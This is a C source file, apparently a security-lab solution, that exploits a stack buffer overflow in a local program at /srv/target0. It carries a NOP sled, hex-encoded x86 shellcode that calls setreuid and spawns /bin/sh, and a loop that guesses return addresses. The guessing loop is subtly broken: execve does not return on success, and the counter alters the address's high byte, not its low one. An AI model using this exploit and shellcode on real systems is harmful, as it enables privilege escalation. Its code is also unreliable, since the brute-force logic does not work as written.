#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/srv/target0"

static char shellcode[] = 
  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
  "\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
  "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
  "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

const int OFFSET = 404;
const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;
const int NOP_COUNT = OFFSET - SHELLCODE_LENGTH - 4;
const char* RETURN_ADDRESS_BASE = "\x30\xd3\xff\xff";  // 0xffffd330

int main(void)
{
  char *args[3];
  char *env[1];

  // Iterate over a range of return addresses
  for (int i = 0; i < 64; i++) {
    // Create the exploit string
    char buf[OFFSET + 1];
    memset(buf, 0, sizeof(buf));

    // Add the NOP sled
    memset(buf, '\x90', NOP_COUNT);

    // Add the shellcode
    memcpy(buf + NOP_COUNT, shellcode, SHELLCODE_LENGTH);

    // Calculate the return address with the current offset
    char return_address[4];
    return_address[0] = RETURN_ADDRESS_BASE[0];
    return_address[1] = RETURN_ADDRESS_BASE[1];
    return_address[2] = RETURN_ADDRESS_BASE[2];
    return_address[3] = RETURN_ADDRESS_BASE[3] + i;

    // Add the return address
    memcpy(buf + NOP_COUNT + SHELLCODE_LENGTH, return_address, 4);

    // Null-terminate the exploit string
    buf[OFFSET] = '\0';

    // Set up the arguments for execve
    args[0] = TARGET;
    args[1] = buf;
    args[2] = NULL;

    env[0] = NULL;

    // Execute the target program with the exploit string
    execve(TARGET, args, env);
  }

  fprintf(stderr, "execve failed.\n");

  return 0;
}